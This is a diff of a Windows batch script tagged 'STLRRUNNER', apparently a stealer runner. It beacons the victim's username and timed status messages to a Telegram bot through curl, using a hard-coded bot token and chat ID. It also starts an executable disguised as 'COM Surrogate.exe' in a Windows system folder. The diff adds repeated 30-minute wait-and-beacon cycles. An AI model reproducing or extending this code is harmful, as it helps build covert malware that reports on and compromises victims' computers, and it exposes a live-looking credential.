@@ -10,14 +10,13 @@
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|WAITING1800FORCOM..|%time%"
+set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|30MINLEFTFORSTARTCOM..|%time%"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
-
 echo Message sent to chat ID %CHAT_ID%
 
 
@@ -29,7 +28,7 @@ start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 
 
 
-set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|COMSTARTED.WAITING9000..|%time%"
+set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|COMSTARTED.3H.LEFTFORSTARTCOM..|%time%"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
@@ -40,11 +39,57 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
 
 
 
-timeout /t 9000 /nobreak
+timeout /t 1800 /nobreak
 
 
-
-
-
-set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|9000FINISHED..|%time%"
+set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|2H.30MIN.LEFTFORSTARTCOM..|%time%"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
+
+
+
+timeout /t 1800 /nobreak
+
+
+set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|2H.LEFTFORSTARTCOM..|%time%"
+set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
+
+
+
+timeout /t 1800 /nobreak
+
+
+set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|1H.30MIN.LEFTFORSTARTCOM..|%time%"
+set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
+
+
+
+
+timeout /t 1800 /nobreak
+
+
+set "MESSAGEEVERY=%USERNAME%|STLRRUNNER|1H.LEFTFORSTARTCOM..|%time%"
+set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
+
+
+
+timeout /t 1800 /nobreak
+
+
+
+
